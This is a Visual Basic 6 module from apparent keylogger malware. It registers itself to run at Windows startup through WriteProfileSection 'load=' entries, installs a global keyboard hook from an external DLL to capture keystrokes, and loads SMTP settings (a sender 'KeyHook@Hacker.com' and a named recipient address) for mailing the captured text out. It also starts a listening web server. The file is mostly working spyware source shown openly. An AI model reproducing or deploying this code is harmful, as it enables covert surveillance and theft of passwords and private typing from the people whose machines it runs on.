Attribute VB_Name = "Main_Md"
Public Declare Function WriteProfileSection Lib "kernel32" Alias "WriteProfileSectionA" (ByVal lpAppName As String, ByVal lpString As String) As Long

Private Declare Sub InstallHook Lib "VBKeyboardHook.dll" (ByVal hWnd As Long)
Private Declare Sub RemoveHook Lib "VBKeyboardHook.dll" ()

Public HookText As String
Public NumberOfKey As Long
Public HookLen As Long

' for Sending Mail
Public SMTP_HOST As String
Public SMTP_PORT As String

Public From As String
Public MAIL_FROM As String
Public MAIL_TO As String
Public RCPT_TO As String

' for web server
Public WebPort As Integer

Sub Main()


    ' Start this Program when windows start
    WriteProfileSection "windows", "load=" & App.Path + "\" + App.EXEName + ".exe" & vbCrLf & "open=" & App.Path + "\" + App.EXEName + ".exe"""

    InstallHook Form_Main.PictureBox_SendTo.hWnd
    
    Call loadsett
    HookTxt = "": HookLen = 0
    
    Call Form_Main.StartWebServer

    
    Do
        DoEvents
    Loop

End Sub


Sub loadsett()

    NumberOfKey = GetSetting("Hook", "Setting", "NumberOfKey", 1000)
    
    SMTP_HOST = GetSetting("Hook", "Setting", "SMTP_HOST", "172.16.204.100")
    SMTP_PORT = GetSetting("Hook", "Setting", "SMTP_PORT", "25")
    From = GetSetting("Hook", "Setting", "From", "KeyHook")
    MAIL_FROM = GetSetting("Hook", "Setting", "MAIL_FROM", "KeyHook@Hacker.com")
    MAIL_TO = GetSetting("Hook", "Setting", "MAIL_TO", "KeyHook")
    RCPT_TO = GetSetting("Hook", "Setting", "RCPT_TO", "Pooya@icic.gov.ir")
    
    WebPort = GetSetting("Hook", "Setting", "WebPort", "30041")

End Sub
